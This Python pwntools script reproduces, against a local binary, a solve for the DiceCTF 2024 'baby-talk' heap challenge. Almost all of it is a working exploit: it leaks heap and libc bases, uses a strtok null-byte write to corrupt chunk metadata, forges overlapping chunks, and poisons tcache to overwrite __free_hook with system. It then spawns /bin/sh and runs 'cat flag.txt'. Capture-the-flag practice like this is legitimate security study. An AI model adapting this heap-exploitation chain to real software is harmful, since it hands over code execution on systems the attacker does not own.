#!/usr/bin/env python3
# Local reproduction of DiceCTF 2024 baby-talk solve (from ZhangZhuoSJTU hint2).
# Adapted: remote("server",5000) -> process("./binary"); flag from ./flag.txt.
from pathlib import Path
from pwn import *
import re

ROOT = Path(__file__).resolve().parent
context.binary = str(ROOT / "binary")
context.log_level = "info"

libc = ELF(str(ROOT / "libc.so.6"), checksec=False)


def start():
    return process(str(ROOT / "binary"))


def do_str(io, size: int, data: bytes) -> int:
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size? ", str(size).encode())
    io.sendafter(b"str? ", data)
    io.recvuntil(b"stored at ")
    return int(io.recvuntil(b"!", drop=True).decode())


def do_tok(io, idx: int, delim: bytes) -> list:
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"idx? ", str(idx).encode())
    io.sendlineafter(b"delim? ", delim)
    return io.recvuntil(b"\n1. str", drop=True).splitlines()


def do_del(io, idx: int):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"idx? ", str(idx).encode())


io = start()

# Prime the 0xf8 size class and reuse freed chunks for leaks.
for _ in range(9):
    do_str(io, 0xF8, b"A")

for i in range(9):
    do_del(io, 8 - i)

for _ in range(9):
    do_str(io, 0xF8, b"A")

heap_base = u64(do_tok(io, 0, b".")[0].ljust(8, b"\0")) & ~0xFFF
libc.address = u64(do_tok(io, 7, b".")[0].ljust(8, b"\0")) - 0x3EBE41
log.success(f"heap base = {heap_base:#x}")
log.success(f"libc base = {libc.address:#x}")

# Prepare the overlapping-chunk setup.
do_str(io, 0xF8, b"a" * 0xF8)
do_str(io, 0xF8, b"b")
do_str(io, 0xF8, b"x")

for i in range(6):
    do_del(io, 5 - i)

# strtok writes a null byte into metadata when it finds the delimiter.
do_tok(io, 9, b"\x01")
do_del(io, 9)

victim = do_str(
    io,
    0xF8,
    p64(0) * 2
    + p64(0)
    + p64(0xE0)
    + p64(heap_base + 0xB80) * 2
    + p64(heap_base + 0xB70) * 2
    + b"c" * 0xB0
    + p64(0xE0),
)
do_del(io, victim)
do_del(io, 10)

# tcache double-free style path into __free_hook.
q = do_str(io, 0x18, b"Q")
do_del(io, do_str(io, 0x18, b"x"))
do_del(io, q)

do_str(io, 0xF8, b"X" * 0x18 + p64(0x21) + p64(libc.sym["__free_hook"]))
binsh_idx = do_str(io, 0x18, b"/bin/sh")
do_str(io, 0x18, p64(libc.sym["system"]))

# Trigger system("/bin/sh"), then read local flag.
do_del(io, binsh_idx)
io.sendline(b"echo SHELL && cat flag.txt && exit")

data = io.recvrepeat(2)
print(data.decode("latin-1", "ignore"))

match = re.search(rb"dice\{[^}]+\}", data)
if not match:
    raise SystemExit("flag not found in output")

print(f"FLAG = {match.group().decode()}")